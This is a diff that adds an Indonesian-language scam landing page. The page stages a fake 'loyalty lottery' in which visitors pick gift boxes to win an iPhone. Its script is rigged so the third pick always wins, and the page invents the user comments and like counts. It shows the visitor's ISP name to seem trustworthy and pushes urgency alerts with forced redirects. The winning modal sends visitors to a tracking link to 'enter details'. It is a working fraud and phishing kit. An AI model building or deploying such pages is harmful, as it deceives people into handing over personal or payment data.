@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<base href="../">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="width=device-width,initial-scale=1" name="viewport">
+<meta content="noindex, nofollow, noarchive" name="robots">
+<link rel="stylesheet" href="style.css">
+<title>iPhone</title>
+</head>
+<body>
+    <div class="header">
+        <div class="hcontainer"><b>Memenangkan hadiah </b><b><br>
+           </b></div>
+    </div>
+    <div class="container">
+        <p>Terima kasih atas kesetiaan Anda, jadi kami menawarkan Anda kesempatan untuk mendapatkan hadiah rahasia </p>
+            <div class="instructions"><b>Temukan hadiah rahasia</b>
+                <table>
+                    <tbody><tr>
+                        <td><span class="bounce">↓</span>
+                            </td><td>
+                                <center>Yang harus Anda lakukan adalah memilih kotak hadiah yang tepat</center>
+                                </td><td><span class="bounce">↓</span></td></tr></tbody></table>
+            </div>
+            <div class="boxes" id="boxes">
+                <div id="0"><img src="box_c.png"></div>
+                <div id="1"><img src="box_c.png"></div>
+                <div id="2"><img src="box_c.png"></div>
+                <div id="3"><img src="box_c.png"></div>
+                <div id="4"><img src="box_c.png"></div>
+                <div id="5"><img src="box_c.png"></div>
+                <div id="6"><img src="box_c.png"></div>
+                <div id="7"><img src="box_c.png"></div>
+                <div id="8"><img src="box_c.png"></div>
+                <div id="9"><img src="box_c.png"></div>
+                <div id="10"><img src="box_c.png"></div>
+                <div id="11"><img src="box_c.png"></div>
+            </div>
+            <div class="comments1">
+            <div><small><span id="likes" class="like">19 821</span> Orang menyukai ini</small>
+            </div>
+            <div><span class="photo p1"></span>
+                <div><b>Anna Petrik</b>
+                    <p>Apakah mungkin untuk bermain lagi? :)</p><small><span>Balasan</span> · <span class="like">Suka</span> · <u>4 menit yang lalu</u></small>
+                </div>
+            </div>
+            <div><span class="photo p2"></span>
+                <div><b>Sasha Pavlikova</b>
+                    <p>Saya mendengarnya! iPhone saya baru saja tiba lewat pos, meskipun saya sudah punya satu, saya akan menjualnya, terima kasih semua!</p><small><span>Balasan</span> · <span class="like">Suka</span> · <u>5 menit yang lalu</u></small>
+                </div>
+            </div>
+            <div><span class="photo p3"></span>
+                <div><b>Cristina Rusnakova</b>
+                    <p>Saya mendapatkan iPhone saya hari ini. Terima kasih!Saya mendapatkan iPhone saya hari ini. Terima kasih!</p>
+                    <br><small><span>Balasan</span> · <span class="like">Suka</span> · <u>11 menit yang lalu</u></small>
+                </div>
+            </div>
+            
+        </div>
+    </div>
+    <div id="shadow"></div>
+    <div class="sweet-overlay" style="opacity:1.03;display:block" tabindex="-1"></div>
+    <div class="animated bounceIn sweet-alert visible" id="modal01">
+        <h2 style="margin-top:30px">Anda beruntung!</h2>
+        <p>Anda adalah salah satu dari 10 orang yang dipilih untuk berpartisipasi dalam lotre kesetiaan kami! Anda bisa mendapatkan 1 hadiah dari 4! <b><span id="isp3"></span></b>Pilih satu kotak<b></b>
+            <div class="sa-button-container">
+                <div class="sa-confirm-button-container">
+                    <button onclick="hidemodal01()" style="display:inline-block;box-shadow:rgba(140,212,245,.8) 0 0 2px,rgba(0,0,0,.0470588) 0 0 0 1px inset;background-color:#e84242">OK</button>
+                    <div class="la-ball-fall"></div>
+                </div>
+            </div>
+    </div>
+    <div class="animated bounceIn sweet-alert" id="modal02">
+        <div class="sa-icon sa-success" id="success02"><span class="sa-line sa-tip" id="successtip02"></span> <span class="sa-line sa-long" id="successlong02"></span>
+            <div class="sa-placeholder"></div>
+            <div class="sa-fix"></div>
+        </div>
+        <p id="cnt">Maaf, kotak ini kosong! Anda masih memiliki (<span id="cntVal">[count]</span>) peluang lagi. Semoga beruntung!</p>
+            <div class="sa-button-container">
+                <div class="sa-confirm-button-container">
+                    <button onclick="hidemodal02()" style="display:inline-block;box-shadow:rgba(140,212,245,.8) 0 0 2px,rgba(0,0,0,.0470588) 0 0 0 1px inset;background-color:#e84242">OK</button>
+                    <div class="la-ball-fall"></div>
+                </div>
+            </div>
+    </div>
+    <div class="animated bounceIn sweet-alert" id="modal03">
+        <div class="sa-icon sa-success" id="success03"><span class="sa-line sa-tip" id="successtio03"></span> <span class="sa-line sa-long" id="successlong03"></span>
+            <div class="sa-placeholder"></div>
+            <div class="sa-fix"></div>
+        </div>
+        <h4>(1) iPhone selama 5 menit, dipesan!</h4>
+        <p>***ATURAN***</p>
+        <p>1. Anda akan diarahkan ke situs web komersial kami yang bersertifikat;</p>
+        <p>2. Masukkan detail untuk memulai</p>
+                    <div class="sa-button-container">
+                        <div class="sa-confirm-button-container">
+                            <a href="https://coogletrck3.com/click.php?lp=1" class="mainButton" id="final-button">OK</a>
+                            <div class="la-ball-fall"></div>
+                        </div>
+                    </div>
+                    <script>
+                        ! function(n, e, t) {
+                            for (var o = e.querySelectorAll("#boxes > div"), s = ["box_o_t", "box_o_b", "iphonex"], i = [], c = 3, l = 0; l < s.length; l++) i[l] = new Image, i[l].src = s[l] + ".png";
+                            for (var a = 0; a < o.length; a++) o[a].id = a, o[a].onclick = function() {
+                                var e = this;
+                                if (this.onclick = null, this.innerHTML = "<img src='box_o_t.png' class=box-o-t>", 0 == --c) {
+                                    setTimeout(function() {
+                                        e.className += " discover"
+                                    }, 10);
+                                    this.innerHTML += "<img src='iphonex.png' class=iphone>", navigator.vibrate([1e3, 500, 1e3, 500, 1e3]), setTimeout(function() {
+                                        n.onbeforeunload = null;
+                                        document.getElementById("modal03").className += " visible", document.querySelector(".sweet-overlay").style.display = "block";
+                                        //document.getElementById("success03").className += " animate", audio.play()
+                                    }, 1500);
+                                    document.getElementById("final-button").onClick = function() {
+                                        t.href = odlink
+                                    }
+                                } else setTimeout(function() {
+                                    document.getElementById("success02").className += " animate", document.getElementById("successtip02").className += " animateSuccessTip", document.getElementById("modal02").className += " visible", document.getElementById("cntVal").innerHTML = c, document.querySelector(".sweet-overlay").style.display = "block"
+                                }, 400);
+                                this.innerHTML += "<img src='box_o_b.png' class=box-o-b>"
+                            }
+                        }(window, document, location)
+                    </script>
+                    <script>
+                        function hidemodal01() {
+                            document.getElementById("modal01").classList.remove("visible"), document.querySelector(".sweet-overlay").style.display = "none"
+                        }
+
+                        function hidemodal02() {
+                            document.getElementById("modal02").classList.remove("visible"), document.querySelector(".sweet-overlay").style.display = "none"
+                        }
+                        pz = 1;
+                        var ispi = setInterval(function() {
+                            "undefined" != typeof js && " Long Distance Telephone" != js.isp && "Unknown" != js.isp && (js.isp = js.isp.replace(/\+/g, " "), document.getElementById("isp3").innerHTML = js.isp, document.getElementById("isp2").innerHTML = js.isp, document.getElementById("isp1").innerHTML = js.isp, clearInterval(ispi))
+                        }, 100);
+
+                        function init() {
+                            setTimeout(function() {
+                                window.scrollTo(0, 1)
+                            }, 0)
+                        }
+
+                        setTimeout(function() {
+                            alert("Urgent\n\n\n Hurry, choose a gift"), window.onbeforeunload = null, location.href = tdmnf
+                        }, 18e4)
+                    </script>
+    </div>
+</body>
+</html>
